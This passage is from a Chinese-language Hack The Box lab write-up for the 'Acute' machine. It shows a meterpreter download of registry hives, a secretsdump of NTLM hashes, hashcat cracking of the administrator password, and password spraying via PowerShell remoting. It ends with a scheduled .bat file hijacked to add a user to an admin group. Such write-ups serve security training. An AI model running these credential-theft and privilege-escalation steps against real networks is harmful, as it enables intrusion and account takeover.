class="hljs-params">(<span class="hljs-number">8.64</span>%)</span>: sys.bak -&gt; /home/kali/Desktop/sys.bak<br><br>[*] Downloaded 2.00 MiB of 11.58 <span class="hljs-title function_">MiB</span> <span class="hljs-params">(<span class="hljs-number">17.27</span>%)</span>: sys.bak -&gt; /home/kali/Desktop/sys.bak<br>[*] Downloaded 3.00 MiB of 11.58 <span class="hljs-title function_">MiB</span> <span class="hljs-params">(<span class="hljs-number">25.91</span>%)</span>: sys.bak -&gt; /home/kali/Desktop/sys.bak<br><br>[*] Downloaded 4.00 MiB of 11.58 <span class="hljs-title function_">MiB</span> <span class="hljs-params">(<span class="hljs-number">34.55</span>%)</span>: sys.bak -&gt; /home/kali/Desktop/sys.bak<br><br>[*] Downloaded 5.00 MiB of 11.58 <span class="hljs-title function_">MiB</span> <span class="hljs-params">(<span class="hljs-number">43.18</span>%)</span>: sys.bak -&gt; /home/kali/Desktop/sys.bak<br><br>[*] Downloaded 6.00 MiB of 11.58 <span class="hljs-title function_">MiB</span> <span class="hljs-params">(<span class="hljs-number">51.82</span>%)</span>: sys.bak -&gt; /home/kali/Desktop/sys.bak<br>[*] Downloaded 7.00 MiB of 11.58 <span class="hljs-title function_">MiB</span> <span class="hljs-params">(<span class="hljs-number">60.46</span>%)</span>: sys.bak -&gt; /home/kali/Desktop/sys.bak<br><br>[*] Downloaded 8.00 MiB of 11.58 <span class="hljs-title function_">MiB</span> <span class="hljs-params">(<span class="hljs-number">69.1</span>%)</span>: sys.bak -&gt; /home/kali/Desktop/sys.bak<br>[*] Downloaded 9.00 MiB of 11.58 <span class="hljs-title function_">MiB</span> <span class="hljs-params">(<span class="hljs-number">77.73</span>%)</span>: sys.bak -&gt; /home/kali/Desktop/sys.bak<br>[*] Downloaded 10.00 MiB of 11.58 <span class="hljs-title function_">MiB</span> <span class="hljs-params">(<span class="hljs-number">86.37</span>%)</span>: sys.bak -&gt; /home/kali/Desktop/sys.bak<br>[*] Downloaded 11.00 MiB of 11.58 <span class="hljs-title function_">MiB</span> <span class="hljs-params">(<span class="hljs-number">95.01</span>%)</span>: sys.bak -&gt; /home/kali/Desktop/sys.bak<br>[*] Downloaded 11.58 MiB of 11.58 <span class="hljs-title function_">MiB</span> <span class="hljs-params">(<span class="hljs-number">100.0</span>%)</span>: sys.bak -&gt; /home/kali/Desktop/sys.bak<br>[*] Completed  : sys.bak -&gt; /home/kali/Desktop/sys.bak<br>meterpreter &gt; <br></code></pre></td></tr></table></figure>
+
+<p>28、开始破解密码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ impacket-secretsdump -sam sam.bak -system sys.bak LOCAL<br>Impacket v0<span class="hljs-number">.11</span><span class="hljs-number">.0</span> - Copyright <span class="hljs-number">2023</span> Fortra<br><br>[*] Target system bootKey: <span class="hljs-number">0x44397c32a634e3d8d8f64bff8c614af7</span><br>[*] Dumping local SAM <span class="hljs-title function_">hashes</span> <span class="hljs-params">(uid:rid:lmhash:nthash)</span><br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:24571eab88ac0e2dcef127b8e9ad4740:::<br>Natasha:1001:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::<br>[*] Cleaning up... <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ touch hash       <br>                                                                                                                                                                                        <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo hashcat -m <span class="hljs-number">1000</span> ./hash /usr/share/wordlists/rockyou.txt<br>[sudo] kali 的密码：<br>hashcat (v6<span class="hljs-number">.2</span><span class="hljs-number">.6</span>) starting<br><br>OpenCL <span class="hljs-title function_">API</span> <span class="hljs-params">(OpenCL <span class="hljs-number">3.0</span> PoCL <span class="hljs-number">5.0</span>+debian  Linux, None+Asserts, RELOC, SPIR, LLVM <span class="hljs-number">15.0</span><span class="hljs-number">.7</span>, SLEEF, POCL_DEBUG)</span> - Platform #1 [The pocl project]<br>==========================================================================================================================================<br>* Device #<span class="hljs-number">1</span>: cpu-<span class="hljs-number">-0x000</span>, <span class="hljs-number">1439</span>/<span class="hljs-number">2942</span> MB (<span class="hljs-number">512</span> MB allocatable), <span class="hljs-number">4</span>MCU<br><br>Minimum password length supported by kernel: <span class="hljs-number">0</span><br>Maximum password length supported by kernel: <span class="hljs-number">256</span><br><br>Hashes: <span class="hljs-number">5</span> digests; <span class="hljs-number">4</span> unique digests, <span class="hljs-number">1</span> unique salts<br>Bitmaps: <span class="hljs-number">16</span> bits, <span class="hljs-number">65536</span> entries, <span class="hljs-number">0x0000ffff</span> mask, <span class="hljs-number">262144</span> bytes, <span class="hljs-number">5</span>/<span class="hljs-number">13</span> rotates<br>Rules: <span class="hljs-number">1</span><br><br>Optimizers applied:<br>* Zero-Byte<br>* Early-Skip<br>* Not-Salted<br>* Not-Iterated<br>* Single-Salt<br>* Raw-Hash<br><br>ATTENTION! Pure (unoptimized) backend kernels selected.<br>Pure kernels can crack longer passwords, but drastically reduce performance.<br>If you want to <span class="hljs-keyword">switch</span> to optimized kernels, append -O to your commandline.<br>See the above message to find out about the exact limits.<br><br>Watchdog: Temperature <span class="hljs-built_in">abort</span> trigger <span class="hljs-built_in">set</span> to <span class="hljs-number">90</span>c<br><br>Host memory required <span class="hljs-keyword">for</span> this attack: <span class="hljs-number">0</span> MB<br><br>Dictionary cache hit:<br>* Filename..: /usr/share/wordlists/rockyou.txt<br>* Passwords.: <span class="hljs-number">14344385</span><br>* Bytes.....: <span class="hljs-number">139921507</span><br>* Keyspace..: <span class="hljs-number">14344385</span><br><br><span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:                         <br>a29f7623fd11550def0192de9246f46b:Password@<span class="hljs-number">123</span>             <br>Approaching final keyspace - workload adjusted.           <br><br>                                                          <br>Session..........: hashcat<br>Status...........: Exhausted<br>Hash.Mode........: <span class="hljs-number">1000</span> (NTLM)<br>Hash.Target......: ./hash<br>Time.Started.....: Wed Apr <span class="hljs-number">17</span> <span class="hljs-number">07</span>:<span class="hljs-number">30</span>:<span class="hljs-number">42</span> <span class="hljs-number">2024</span> (<span class="hljs-number">3</span> secs)<br>Time.Estimated...: Wed Apr <span class="hljs-number">17</span> <span class="hljs-number">07</span>:<span class="hljs-number">30</span>:<span class="hljs-number">45</span> <span class="hljs-number">2024</span> (<span class="hljs-number">0</span> secs)<br>Kernel.Feature...: Pure Kernel<br>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)<br>Guess.Queue......: <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%)<br>Speed.#<span class="hljs-number">1.</span>........:  <span class="hljs-number">5461.1</span> kH/s (<span class="hljs-number">0.05</span>ms) @ Accel:<span class="hljs-number">256</span> Loops:<span class="hljs-number">1</span> Thr:<span class="hljs-number">1</span> Vec:<span class="hljs-number">4</span><br>Recovered........: <span class="hljs-number">2</span>/<span class="hljs-number">4</span> (<span class="hljs-number">50.00</span>%) Digests (total), <span class="hljs-number">2</span>/<span class="hljs-number">4</span> (<span class="hljs-number">50.00</span>%) Digests (new)<br>Progress.........: <span class="hljs-number">14344385</span>/<span class="hljs-number">14344385</span> (<span class="hljs-number">100.00</span>%)<br>Rejected.........: <span class="hljs-number">0</span>/<span class="hljs-number">14344385</span> (<span class="hljs-number">0.00</span>%)<br>Restore.Point....: <span class="hljs-number">14344385</span>/<span class="hljs-number">14344385</span> (<span class="hljs-number">100.00</span>%)<br>Restore.Sub.#<span class="hljs-number">1.</span>..: Salt:<span class="hljs-number">0</span> Amplifier:<span class="hljs-number">0</span><span class="hljs-number">-1</span> Iteration:<span class="hljs-number">0</span><span class="hljs-number">-1</span><br>Candidate.Engine.: Device Generator<br>Candidates.#<span class="hljs-number">1.</span>...: $HEX[<span class="hljs-number">206b</span>72697374656e616e6e65] -&gt; $HEX[<span class="hljs-number">042</span>a0337c2a156616d6f732103]<br>Hardware.Mon.#<span class="hljs-number">1.</span>.: Util: <span class="hljs-number">42</span>%<br><br>Started: Wed Apr <span class="hljs-number">17</span> <span class="hljs-number">07</span>:<span class="hljs-number">30</span>:<span class="hljs-number">41</span> <span class="hljs-number">2024</span><br>Stopped: Wed Apr <span class="hljs-number">17</span> <span class="hljs-number">07</span>:<span class="hljs-number">30</span>:<span class="hljs-number">46</span> <span class="hljs-number">2024</span><br></code></pre></td></tr></table></figure>
+
+<p>29、它破解了Guest（普通）的空密码和Administrator的“Password@123”。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">Administrator<br><br>Password@<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure>
+
+<p>30、啊哈！密码重复使用？也许有域用户重复使用了该密码？让我们在edavies反向 shell 会话上对域控制器进行密码喷射！在我的第一次尝试中，域用户awallace成功了！</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Utils&gt; $pass = ConvertTo-SecureString <span class="hljs-string">&quot;Password@123&quot;</span> -AsPlainText -Force<br>$pass = ConvertTo-SecureString <span class="hljs-string">&quot;Password@123&quot;</span> -AsPlainText -Force<br>PS C:\Utils&gt; $cred = New-Object System.Management.Automation.PSCredential(<span class="hljs-string">&quot;ACUTE\awallace&quot;</span>, $pass)<br>$cred = New-Object System.Management.Automation.PSCredential(<span class="hljs-string">&quot;ACUTE\awallace&quot;</span>, $pass)<br>PS C:\Utils&gt; Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock &#123; whoami &#125;<br>Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock &#123; whoami &#125;<br>acute\awallace<br>PS C:\Utils&gt; <br></code></pre></td></tr></table></figure>
+
+<p>31、添加awallace，鉴于.batLois 每五分钟运行一次脚本，我将编写一个脚本来添加 awallace Site_Admin：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Utils&gt; Invoke-Command -ScriptBlock &#123; Set-Content -Path <span class="hljs-string">&#x27;\program files\keepmeon\0xdf.bat&#x27;</span> -Value <span class="hljs-string">&#x27;net group site_admin awallace /add /domain&#x27;</span>&#125; -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred<br>Invoke-Command -ScriptBlock &#123; Set-Content -Path <span class="hljs-string">&#x27;\program files\keepmeon\0xdf.bat&#x27;</span> -Value <span class="hljs-string">&#x27;net group site_admin awallace /add /domain&#x27;</span>&#125; -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred<br>PS C:\Utils&gt; Invoke-Command -ScriptBlock &#123; cat <span class="hljs-string">&#x27;\program files\keepmeon\0xdf.bat&#x27;</span> &#125; -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred <br>Invoke-Command -ScriptBlock &#123; cat <span class="hljs-string">&#x27;\program files\keepmeon\0xdf.bat&#x27;</span> &#125; -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred <br>net group site_admin awallace /add /domain<br>PS C:\Utils&gt; <br></code></pre></td></tr></table></figure>
+
+<p>32、等待过个分钟后，我成功了读取到了flag信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Utils&gt; Invoke-Command -ScriptBlock &#123; cat \users\administrator\desktop\root.txt  &#125; -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred<br>Invoke-Command -ScriptBlock &#123; cat \users\administrator\desktop\root.txt  &#125; -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred<br><span class="hljs-number">9</span>cce45e48fdb55bd12962d4a7b4691bc<br>PS C:\Utils&gt; <br></code></pre></td></tr></table></figure>
+
+
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/438</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Acute-htb-writeup</div>
+      <div>https://sh1yan.top/2024/04/16/Acute-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年4月16日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/04/19/Busqueda-htb-writeup/" title="Busqueda-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Busqueda-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/04/15/Object-htb-writeup/" title="Object-htb-writeup">
+                        <span class="hidden-mobile">Object-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
